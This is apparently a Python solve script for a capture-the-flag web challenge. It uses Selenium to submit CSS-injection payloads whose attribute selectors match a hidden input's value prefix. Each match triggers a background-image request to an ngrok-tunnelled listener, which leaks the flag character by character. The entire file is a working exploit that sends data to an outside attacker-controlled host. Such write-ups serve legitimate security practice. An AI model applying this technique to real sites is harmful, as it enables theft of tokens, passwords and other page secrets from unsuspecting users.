#!/usr/bin/python3
# Remember to start geckodriver first /root/boxes/test/browser_automation/geckodriver &
import re
import threading
import string
import queue
import os
from http.server import HTTPServer, BaseHTTPRequestHandler

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from pyngrok import ngrok

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        data_queue.put(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    def log_message(self, format, *args):
        return

class Listener():
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        self.server.serve_forever()

    def stop_listener(self):
        self.server.shutdown()

def extract_query_params(query_string):
    pattern = re.compile(r'data=([^&=?]+)')
    match = pattern.search(query_string)
    if match:
        return match.group(1)
    else:
        return None 

def get_data(timeout=5):
    try:
        data = data_queue.get(timeout=timeout)
        value = extract_query_params(data)
        return value
    except queue.Empty:
        return None

data_queue = queue.Queue()

def main():
    valid_chars = string.ascii_uppercase + string.digits + 'f'
    gecko_path = '/root/boxes/test/browser_automation/geckodriver'

    # Create FirefoxOptions and set the executable path
    firefox_options = Options()
    firefox_options.binary_location = gecko_path
    driver = webdriver.Firefox(options=firefox_options)    

    listener = Listener(1337)
    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
    listener_thread.start() 

    start_ngrok = ngrok.connect(1337, "tcp")
    url = start_ngrok.public_url.replace("tcp://", "http://")
    ngrok.set_auth_token(os.getenv("NGROK_AUTHTOKEN"))
    

    found = "grey{"
    while 1:
        for char in valid_chars:
            driver.get('http://challs.nusgreyhats.org:33339/')

            input_element = driver.find_element(By.ID, "css-submit")
            input_element.send_keys(f'input[value^="{found}{char}"] {{ color: red; background: url({url}/?data={char}); }}')


            submit_button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//button[@type='submit']"))
            )
            submit_button.click()

            # Wait for the new page or elements to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//input[@type='submit']"))
            )

            # Refind the button in the new page context
            submit_button2 = driver.find_element(By.XPATH, "//input[@type='submit']")
            submit_button2.click()
            print(f"Building Flag: {found}{char}", end='\r', flush=True)
        found_char = get_data()
        if found_char:
            found += found_char
        else:
            found += '}'
            break
    print(" " * 150, end='\r')
    print(f"Flag: {found}")

    listener.stop_listener()
    listener_thread.join()
    ngrok.disconnect(start_ngrok.public_url)

if __name__ == '__main__':
    main()
